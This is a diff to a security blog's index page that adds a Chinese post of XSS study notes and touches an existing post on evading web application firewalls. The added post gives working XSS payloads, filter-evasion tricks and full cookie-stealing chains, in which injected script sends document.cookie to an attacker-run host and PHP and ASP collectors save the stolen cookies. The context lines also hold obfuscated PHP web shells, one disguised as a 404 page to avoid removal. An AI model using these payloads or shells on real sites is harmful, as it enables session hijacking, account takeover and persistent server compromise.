@@ -266,6 +266,161 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/23/xss学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Saber">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Merl1ng">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/23/xss学习笔记/" itemprop="url">xss学习笔记</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-23T22:27:34+08:00">
+                2017-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="xss就是在页面执行你想要的js"><a href="#xss就是在页面执行你想要的js" class="headerlink" title="xss就是在页面执行你想要的js"></a><em>xss就是在页面执行你想要的js</em></h3><p>xss原理<br>本地搭建php环境 然后在index.php文件里写入如下代码<br>(index是普遍意义上”首页”)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </div><div class="line">&lt;title&gt;XSS原理重现&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"xss_input"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">'xss_input'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="string">'你输入的字符为&lt;br&gt;'</span>.<span class="variable">$xss</span>;</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>成功弹窗<br>输出点在<code>&lt;br&gt;</code>和<code>&lt;/boby&gt;</code>里</p>
+<p>利用xss输出的环境来构造代码<br>(除了上述的在<br>和里，还有很多其他情况)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </div><div class="line">&lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</div><div class="line">&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"xss_input_value"</span> value=<span class="string">"输入"</span>&gt;&lt;br&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">'xss_input_value'</span>];</div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$xss</span>))&#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="text" value="'</span>.<span class="variable">$xss</span>.<span class="string">'"&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="type" value="输出"&gt;'</span>;</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>这时输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>无弹窗<br>因为输入点在value属性里面，会被当成value里的值来显现出来，所以并没有弹窗<br><code>因此改为&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code><br>闭合input标签 成功弹窗</p>
+<p>但是会多出一个”&gt; 并会直接把多余的字符串输出<br>原因在于使用了标签 </p>
+<p>so…需要在input标签里不带标签的且可以调用js的属性<br>-&gt;on事件<br><code>&quot; onclick=&quot;alert(&#39;xss&#39;)</code><br>onclick-&gt;当鼠标点击的第二个input输入框时触发<br>也可以成功弹窗</p>
+<p>进一步 可以把onclick改成<br>Onmousemove 当鼠标移动就触发<br>Onload 当页面加载完成后触发</p>
+<p>在<code>&lt;textarea&gt;</code>标签里 或者其他优先级比script高的标签<br>通过闭合完整的标签<br><code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<p>几种过滤的解决办法（暂时放这）<br><code>&lt;img scr=1 onerror=alert(&#39;xss&#39;)&gt;</code>当找不到图片名为1的文件时，执行alert(‘xss’)<br><code>&lt;a href=javascrip:alert(&#39;xss&#39;)&gt;s&lt;/a&gt;</code> 点击s时运行alert(‘xss’)<br><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;</code>利用iframe的scr来弹窗<br><code>&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;</code>过滤了alert来执行弹窗</p>
+<p>xss分类<br>反射XSS、储蓄XSS、DOM XSS</p>
+<p>反射XSS<br>Hacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短——发送给受害人——<br>受害打开后执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等)</p>
+<p>比如<a href="http://qaq.cn/id=123存在xss漏洞" target="_blank" rel="external">http://qaq.cn/id=123存在xss漏洞</a><br>可用JSky、Safe3WVS、Netsparker等软件挖掘出部分反射XSS<br>查看网站源码（view-source:网址 ctrl+u）<br>在id=123后面写abc ctrl+f搜索abc<br>看其出现在哪个位置<br>根据环境构造代码 写在之后 比如<br><code>http://qaq.cn/id=123&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code><br>把url变成短连接，发送给管理员，诱使管理员打开</p>
+<p>储蓄XSS<br>储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上<br>打开留言处(book.asp)<br>先在留言里出输入<a>s</a>提交留言，F12打开审查元素，来看输入的标签是否被过滤了<br>如果<a>s</a>是彩色的说明没有过滤，如果是灰色就说明过滤了<br>若没过滤 再次留言 可写<br><code>&quot;&lt;script src=&quot;url&quot;&gt;&lt;/script&gt;请问怎么报名啊&quot;</code><br>url为你自己的网站<br>无论是谁点击了你所留言的网址（不是你自己那个网址）<br>即可收割cookie</p>
+<p>Exp 1<br><code>&lt;script src=&quot;http://qaq.com/joke/joke.js&quot;&gt;&lt;/script&gt;</code><br>将先加载joke.js的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var img = document.createElement(<span class="string">'img'</span>);</div><div class="line">img.width = 0;</div><div class="line">img.height = 0;</div><div class="line">img.src = <span class="string">'http://qaqcom/joke/joke.php?joke='</span>+encodeURIComponent(document.cookie);</div></pre></td></tr></table></figure>
+<p>创建一个img标签，将它的src属性指向.预先写好的一个脚本joke.php 并且将页面的cookie最为参数附加到url后面</p>
+<p>joke.php里解析请求里面的joke参数（即用户的cookie）然后保存</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    @ini_set(<span class="string">'display_errors'</span>,1);</div><div class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">'joke'</span>];</div><div class="line">    <span class="variable">$filePath</span> = <span class="string">"joke.php"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(is_writable(<span class="variable">$filePath</span>)==<span class="literal">false</span>)&#123;</div><div class="line">         <span class="built_in">echo</span> <span class="string">"can't write"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">          <span class="variable">$handler</span> = fopen(filePath, <span class="string">"a"</span>);</div><div class="line">          fwrite(<span class="variable">$handler</span>, <span class="variable">$str</span>);</div><div class="line">          fclose(<span class="variable">$handler</span>);</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>Exp 2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;title&gt;xx&lt;/title&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;%testfile = Server.MapPath(<span class="string">"code.txt"</span>) //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中</div><div class="line"></div><div class="line">msg = Request(<span class="string">"msg"</span>) //获取提交过来的msg变量，也就是cookie值</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = server.CreateObject(<span class="string">"scripting.filesystemobject"</span>)//创建一个fs对象</div><div class="line"></div><div class="line"><span class="built_in">set</span> thisfile = fs.OpenTextFile(testfile,8,True,0)</div><div class="line"></div><div class="line">thisfile.WriteLine(<span class="string">""</span>&amp;msg&amp;<span class="string">""</span>)//像code.txt中写入获取来的cookie</div><div class="line"></div><div class="line">thisfile.close() //关闭</div><div class="line"></div><div class="line"><span class="built_in">set</span> fs = nothing%&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>把上述文件保存为cookie.asp文件，放到自己的网站服务器下<br>xss构造为<br><code>&lt;script&gt;window.open(&#39;http://10.65.20.196:8080/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt;</code></p>
+<p>点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/20/bypass_waf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -362,7 +517,7 @@
 <p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
 <p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
 <p>姿势四 防止管理员删shell&gt;伪装成404</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line">$xx=getallheaders()[&apos;xx&apos;];</div><div class="line">$oo=getallheaders()[&apos;oo&apos;];</div><div class="line">if($xx!=&quot;&quot; and $oo!=&quot;&quot;)&#123;</div><div class="line">  $xx=gzuncompress(base64_decode($xx));$xx(gzuncompress(base64_decode($oo)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
 <p>SQl XSS bypass waf</p>
 <p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
 <p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
@@ -982,7 +1137,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -993,7 +1148,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">categories</span>
               </a>
             </div>
@@ -1004,7 +1159,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
